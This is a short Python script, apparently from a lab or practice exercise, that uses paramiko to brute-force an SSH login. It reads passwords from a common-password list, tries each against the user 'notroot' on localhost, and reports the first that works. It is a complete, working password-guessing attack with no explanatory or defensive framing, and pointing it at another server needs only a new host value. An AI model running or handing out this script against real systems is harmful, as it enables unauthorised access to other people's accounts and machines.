import paramiko

host = "127.0.0.1"
username = "notroot"
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

attempts = 0
with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip()  # Remove trailing newline characters
        try:
            attempts += 1
            print("[{}] Attempting password: '{}'".format(attempts, password))
            ssh.connect(host, username=username, password=password, timeout=5)
            print("[>] Valid password found: '{}'".format(password))
            break  # Break out of the loop if a valid password is found
        except paramiko.AuthenticationException:
            # Password authentication failed, try the next password
            continue
        except Exception as e:
            print("Error occurred:", str(e))
            break  # Break out of the loop in case of unexpected errors

ssh.close()
